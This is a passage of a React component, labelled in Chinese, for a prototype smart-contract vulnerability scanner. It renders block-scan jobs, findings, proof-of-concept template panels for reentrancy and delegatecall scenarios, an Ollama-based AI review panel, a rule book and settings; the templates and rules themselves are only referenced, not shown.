                    const continuous = endBlock === null || (contEl && contEl.checked);
                    const total = continuous ? null : Math.max(0, (endBlock || 0) - startBlock + 1);
                    const id = `JOB-${Date.now()}`;
                    setBlockJobs((prev) => [
                      {
                        id,
                        network,
                        startBlock,
                        endBlock,
                        continuous,
                        status: "running",
                        processed: 0,
                        total,
                        findings: { high: 0, medium: 0, low: 0 },
                        startedAt: new Date().toISOString().slice(0, 16).replace("T", " "),
                        speed: 0
                      },
                      ...prev,
                    ]);
                  }}
                >
                  开始扫描（演示）
                </button>
              </div>
            </div>

            {/* 任务列表 */}
            <div className="p-4 rounded-2xl shadow bg-zinc-900/40 border border-zinc-800">
              <h2 className="text-lg font-semibold">任务列表</h2>
              <div className="mt-3 space-y-3">
                {blockJobs.map((job) => {
                  const pct = percent(job);
                  return (
                    <div key={job.id} className="p-3 rounded-xl bg-black/20 border border-zinc-800">
                      <div className="flex items-center justify-between gap-3 flex-wrap">
                        <div className="font-semibold">{job.id}</div>
                        <div className="text-xs text-zinc-400">{job.network} · {job.startBlock} → {job.endBlock ?? "∞"} · {job.startedAt}</div>
                        <div>{job.status === "running" ? <Badge tone="yellow">进行中</Badge> : job.status === "done" ? <Badge tone="green">已完成</Badge> : job.status === "paused" ? <Badge tone="blue">已暂停</Badge> : <Badge>已取消</Badge>}</div>
                      </div>
                      <div className="mt-2">
                        {pct === null ? (
                          <div className="w-full h-2 bg-zinc-800 rounded-lg overflow-hidden">
                            <div className="h-2 bg-zinc-400 animate-pulse" style={{ width: "40%" }} />
                          </div>
                        ) : (
                          <div className="w-full h-2 bg-zinc-800 rounded-lg overflow-hidden">
                            <div className="h-2 bg-green-500" style={{ width: `${pct}%` }} />
                          </div>
                        )}
                        <div className="text-xs text-zinc-400 mt-1 flex items-center justify-between">
                          <span>进度：{pct === null ? "持续中" : `${pct}%`} · 已处理 {job.processed}{job.total ? `/${job.total}` : ""} 块</span>
                          <span>速率：{job.speed} blk/s · ETA：{fmtETA(job)}</span>
                        </div>
                      </div>
                      <div className="mt-2 text-xs text-zinc-400">
                        发现统计：<Badge tone="red">H:{job.findings.high}</Badge> <Badge tone="yellow">M:{job.findings.medium}</Badge> <Badge tone="blue">L:{job.findings.low}</Badge>
                      </div>
                      <div className="mt-2 flex gap-2 text-sm">
                        {job.status === "running" ? (
                          <button className="px-2 py-1 rounded-lg bg-zinc-800 border border-zinc-700" onClick={() => setBlockJobs((prev) => prev.map((j) => j.id === job.id ? { ...j, status: "paused" } : j))}>暂停</button>
                        ) : (
                          <button className="px-2 py-1 rounded-lg bg-zinc-800 border border-zinc-700" onClick={() => setBlockJobs((prev) => prev.map((j) => j.id === job.id ? { ...j, status: "running" } : j))}>继续</button>
                        )}
                        <button className="px-2 py-1 rounded-lg bg-zinc-800 border border-zinc-700" onClick={() => setBlockJobs((prev) => prev.map((j) => j.id === job.id ? { ...j, status: "done", processed: j.total ?? j.processed } : j))}>完成</button>
                        <button className="px-2 py-1 rounded-lg bg-zinc-900 border border-zinc-800" onClick={() => setBlockJobs((prev) => prev.filter((j) => j.id !== job.id))}>删除</button>
                      </div>
                    </div>
                  );
                })}
              </div>
            </div>
          </section>
        )}

        {/* 扫描结果详情 */}
        {tab === "results" && selected && (
          <section className="mt-6 space-y-4">
            <div className="p-4 rounded-2xl shadow bg-zinc-900/40 border border-zinc-800">
              <div className="flex items-start justify-between gap-4">
                <div>
                  <h2 className="text-lg font-semibold">{selected.id}</h2>
                  <div className="text-sm text-zinc-400 mt-1 flex gap-3 flex-wrap">
                    <span>目标：<span className="font-mono text-zinc-300">{selected.target}</span></span>
                    <span>类型：<Badge tone="blue">{selected.targetType}</Badge></span>
                    <span>网络：{selected.network}</span>
                    <span>时间：{selected.createdAt}</span>
                  </div>
                </div>
                <div className="text-right">
                  {selected.status === "safe" ? (
                    <SeverityPill sev="Safe" />
                  ) : (
                    <SeverityPill sev="High" />
                  )}
                  <div className="text-xs text-zinc-400 mt-2">H:{selected.summary.high} / M:{selected.summary.medium} / L:{selected.summary.low}</div>
                </div>
              </div>
              <p className="text-sm text-zinc-300 mt-3">{selected.notes}</p>
              {selected.libs?.length ? (
                <div className="mt-2 text-sm text-zinc-400">检测到依赖库：{selected.libs.join(", ")}</div>
              ) : (
                <div className="mt-2 text-sm text-zinc-500">未检测到依赖库元信息</div>
              )}
            </div>

            <div className="p-4 rounded-2xl shadow bg-zinc-900/40 border border-zinc-800">
              <div className="flex items-center justify-between gap-3 flex-wrap">
                <h3 className="font-semibold">漏洞列表</h3>
                <div className="text-xs text-zinc-400">共 {selected.findings.length} 项</div>
              </div>
              <div className="mt-3 space-y-3">
                {selected.findings.map((f) => (
                  <FindingItem key={f.id} f={f} />
                ))}
              </div>
            </div>

            <div className="p-4 rounded-2xl shadow bg-zinc-900/40 border border-zinc-800">
              <div className="flex items-center justify-between">
                <h3 className="font-semibold">POC / 模拟结果</h3>
                {selected.poc?.generated ? <Badge tone="green">已生成</Badge> : <Badge tone="zinc">未生成</Badge>}
              </div>
              {selected.poc?.generated ? (
                <div className="mt-2">
                  <div className="text-sm text-zinc-300">工具：{selected.poc.tool}</div>
                  <div className="text-sm text-zinc-300 mt-1">摘要：{selected.poc.gist}</div>
                  <pre className="mt-2 text-xs bg-black/30 p-2 rounded-lg border border-zinc-800">{(selected.poc.logs || []).join("\n")}</pre>
                </div>
              ) : (
                <p className="text-sm text-zinc-400 mt-2">未检测到高风险漏洞，因此未生成 POC。</p>
              )}
            </div>
          </section>
        )}

        {/* POC & 模拟（保持） */}
        {tab === "poc" && (
          <section className="mt-6 grid lg:grid-cols-2 gap-4">
            <div className="p-4 rounded-2xl shadow bg-zinc-900/40 border border-zinc-800">
              <h2 className="text-lg font-semibold">场景与参数</h2>
              <div className="mt-3 grid gap-2 text-sm">
                <label className="flex items-center gap-2">场景：
                  <select className="px-2 py-1 bg-zinc-950 border border-zinc-800 rounded-lg" value={pocScene} onChange={(e)=>setPocScene(e.target.value)}>
                    <option value="Reentrancy">Reentrancy</option>
                    <option value="DelegatecallHijack">Delegatecall Hijack</option>
                  </select>
                </label>
                <label className="flex items-center gap-2">Victim 地址：
                  <input className="flex-1 px-2 py-1 bg-zinc-950 border border-zinc-800 rounded-lg font-mono" value={victimAddr} onChange={(e)=>setVictimAddr(e.target.value)} />
                </label>
                <label className="flex items-center gap-2">Attacker 地址（可选）：
                  <input className="flex-1 px-2 py-1 bg-zinc-950 border border-zinc-800 rounded-lg font-mono" value={attackerAddr} onChange={(e)=>setAttackerAddr(e.target.value)} />
                </label>
                <div className="text-xs text-zinc-500">提示：本页生成的代码仅为**教学与安全测试**用途，切勿用于非法环境。</div>
              </div>
            </div>

            <div className="p-4 rounded-2xl shadow bg-zinc-900/40 border border-zinc-800">
              <h2 className="text-lg font-semibold">攻击合约模板（Attack.sol）</h2>
              <p className="text-sm text-zinc-400 mt-1">根据场景自动生成</p>
              <pre className="mt-3 text-xs bg-black/30 p-2 rounded-lg border border-zinc-800 whitespace-pre-wrap">{pocTemplates.attackSol}</pre>
            </div>

            <div className="p-4 rounded-2xl shadow bg-zinc-900/40 border border-zinc-800">
              <h2 className="text-lg font-semibold">Foundry 测试/脚本模板</h2>
              <pre className="mt-3 text-xs bg-black/30 p-2 rounded-lg border border-zinc-800 whitespace-pre-wrap">{pocTemplates.foundryTest}</pre>
              <div className="mt-3 text-sm">
                <div>运行建议：</div>
                <pre className="mt-1 text-xs bg-black/30 p-2 rounded-lg border border-zinc-800">{
`anvil --fork-url $SEPOLIA_RPC --block 6942000
forge test -m ${pocScene==='Reentrancy'?'test_reentrancy':'test_delegatecall_hijack'}`
}</pre>
              </div>
            </div>

            <div className="p-4 rounded-2xl shadow bg-zinc-900/40 border border-zinc-800">
              <h2 className="text-lg font-semibold">Hardhat 测试模板</h2>
              <pre className="mt-3 text-xs bg-black/30 p-2 rounded-lg border border-zinc-800 whitespace-pre-wrap">{pocTemplates.hardhatTest}</pre>
              <div className="mt-3 text-sm">
                <div>运行建议：</div>
                <pre className="mt-1 text-xs bg-black/30 p-2 rounded-lg border border-zinc-800">{
`ANVIL_FORK=$SEPOLIA_RPC
anvil --fork-url $ANVIL_FORK --block 6942000
npx hardhat test`}
</pre>
              </div>
            </div>
          </section>
        )}

        {/* AI 复查 */}
        {tab === "ai" && (
          <section className="mt-6 grid lg:grid-cols-2 gap-4">
            <div className="p-4 rounded-2xl shadow bg-zinc-900/40 border border-zinc-800">
              <h2 className="text-lg font-semibold">AI 复查配置（Ollama）</h2>
              <div className="mt-3 grid gap-2 text-sm">
                <label className="flex items-center gap-2">启用
                  <input type="checkbox" className="accent-blue-500" checked={aiConfig.enabled} onChange={(e)=>setAiConfig({ ...aiConfig, enabled: e.target.checked })} />
                </label>
                <label className="flex items-center gap-2">Endpoint
                  <input className="flex-1 px-2 py-1 bg-zinc-950 border border-zinc-800 rounded-lg font-mono" value={aiConfig.endpoint} onChange={(e)=>setAiConfig({ ...aiConfig, endpoint: e.target.value })} />
                </label>
                <label className="flex items-center gap-2">Model
                  <input className="flex-1 px-2 py-1 bg-zinc-950 border border-zinc-800 rounded-lg" value={aiConfig.model} onChange={(e)=>setAiConfig({ ...aiConfig, model: e.target.value })} placeholder="llama3.1 / qwen2.5 / mistral" />
                </label>
                <label className="grid gap-1">Prompt 模板
                  <textarea className="w-full h-28 p-2 bg-zinc-950 border border-zinc-800 rounded-lg" value={aiConfig.prompt} onChange={(e)=>setAiConfig({ ...aiConfig, prompt: e.target.value })} />
                </label>
                <button className="mt-1 px-3 py-2 rounded-xl bg-blue-600 hover:bg-blue-500" onClick={runAiReview}>对当前扫描结果进行 AI 复查（演示）</button>
              </div>
            </div>
            <div className="p-4 rounded-2xl shadow bg-zinc-900/40 border border-zinc-800">
              <h2 className="text-lg font-semibold">AI 复核报告（模拟输出）</h2>
              <pre className="mt-3 text-sm bg-black/30 p-3 rounded-lg border border-zinc-800 whitespace-pre-wrap">{aiOutput || "（点击左侧按钮生成）"}</pre>
            </div>
          </section>
        )}

        {/* 规则库 */}
        {tab === "rules" && (
          <section className="mt-6 p-4 rounded-2xl shadow bg-zinc-900/40 border border-zinc-800">
            <div className="flex items-center justify-between">
              <h2 className="text-lg font-semibold">漏洞规则库（示例）</h2>
              <Badge>{ruleBook.length} 条</Badge>
            </div>
            <div className="grid md:grid-cols-2 lg:grid-cols-3 gap-3 mt-3">
              {ruleBook.map((r) => (
                <div key={r.id} className="p-3 rounded-xl bg-black/20 border border-zinc-800">
                  <div className="flex items-center justify-between">
                    <div className="font-semibold">{r.name}</div>
                    <SeverityPill sev={r.severity} />
                  </div>
                  <div className="text-xs text-zinc-400 mt-1">规则ID: {r.id}</div>
                  <div className="text-sm text-zinc-300 mt-2">模式：{r.pattern}</div>
                </div>
              ))}
            </div>
          </section>
        )}

        {/* 设置（含 AI 与 Tests） */}
        {tab === "settings" && (
          <section className="mt-6 grid md:grid-cols-2 gap-4">
            <div className="p-4 rounded-2xl shadow bg-zinc-900/40 border border-zinc-800">
              <h2 className="text-lg font-semibold">后端连接与源</h2>
              <div className="text-sm text-zinc-400 mt-2">不会保存，仅用于原型展示</div>
              <div className="mt-3 grid gap-2">
                <input className="px-3 py-2 bg-zinc-950 border border-zinc-800 rounded-xl" placeholder="SEPOLIA_RPC=https://..." />
                <input className="px-3 py-2 bg-zinc-950 border border-zinc-800 rounded-xl" placeholder="ETHEREUM_RPC=https://..." />
                <input className="px-3 py-2 bg-zinc-950 border border-zinc-800 rounded-xl" placeholder="BLOCKSCOUT_API_KEY=...（可选）" />
                <input className="px-3 py-2 bg-zinc-950 border border-zinc-800 rounded-xl" placeholder="ETHERSCAN_API_KEY=..." />
                <input className="px-3 py-2 bg-zinc-950 border border-zinc-800 rounded-xl" placeholder="SOURCIFY_URL=https://repo.sourcify.dev" />
                <div className="grid grid-cols-2 gap-2">
                  <input className="px-3 py-2 bg-zinc-950 border border-zinc-800 rounded-xl" placeholder="Fork Block=6942000" />
                  <input className="px-3 py-2 bg-zinc-950 border border-zinc-800 rounded-xl" placeholder="Max Parallelism=4" />
                </div>
                <div className="grid gap-2 text-sm">
                  <label className="flex items-center gap-2"><input type="checkbox" defaultChecked className="accent-blue-500" /> 启用代理识别（EIP-1967/UUPS/Transparent）</label>
                  <label className="flex items-center gap-2"><input type="checkbox" defaultChecked className="accent-blue-500" /> 启用 AST 基线对比（OpenZeppelin）</label>
                  <label className="flex items-center gap-2"><input type="checkbox" defaultChecked className="accent-blue-500" /> 启用 POC 自动生成</label>
                  <label className="flex items-center gap-2"><input type="checkbox" className="accent-blue-500" /> 记录 TX Trace（可能较慢）</label>
                </div>
                <button className="px-3 py-2 rounded-xl bg-zinc-800 border border-zinc-700">保存（演示）</button>
              </div>
            </div>

            <div className="p-4 rounded-2xl shadow bg-zinc-900/40 border border-zinc-800">
              <h2 className="text-lg font-semibold">AI 复查设置</h2>
              <div className="mt-3 grid gap-2 text-sm">
                <label className="flex items-center gap-2">启用
                  <input type="checkbox" className="accent-blue-500" checked={aiConfig.enabled} onChange={(e)=>setAiConfig({ ...aiConfig, enabled: e.target.checked })} />
                </label>
                <input className="px-3 py-2 bg-zinc-950 border border-zinc-800 rounded-xl" value={aiConfig.endpoint} onChange={(e)=>setAiConfig({ ...aiConfig, endpoint: e.target.value })} />
                <input className="px-3 py-2 bg-zinc-950 border border-zinc-800 rounded-xl" value={aiConfig.model} onChange={(e)=>setAiConfig({ ...aiConfig, model: e.target.value })} />
                <textarea className="w-full h-24 p-2 bg-zinc-950 border border-zinc-800 rounded-xl" value={aiConfig.prompt} onChange={(e)=>setAiConfig({ ...aiConfig, prompt: e.target.value })} />
              </div>
            </div>

            {/* 开发者自检（Tests） */}
            <div className="p-4 rounded-2xl shadow bg-zinc-900/40 border border-zinc-800 md:col-span-2">
              <h2 className="text-lg font-semibold">开发者自检（Tests）</h2>
              <div className="mt-3 grid md:grid-cols-2 lg:grid-cols-3 gap-3">
                {selfTests.map((t, i) => (
                  <div key={i} className="p-3 rounded-xl bg-black/20 border border-zinc-800">
                    <div className="flex items-center justify-between">
                      <div className="font-semibold">{t.name}</div>
                      {t.pass ? <Badge tone="green">PASS</Badge> : <Badge tone="red">FAIL</Badge>}
                    </div>
                    <div className="text-xs text-zinc-400 mt-1">{t.details}</div>
                  </div>
                ))}
              </div>
            </div>
          </section>
        )}
      </div>
    </div>
  );
}
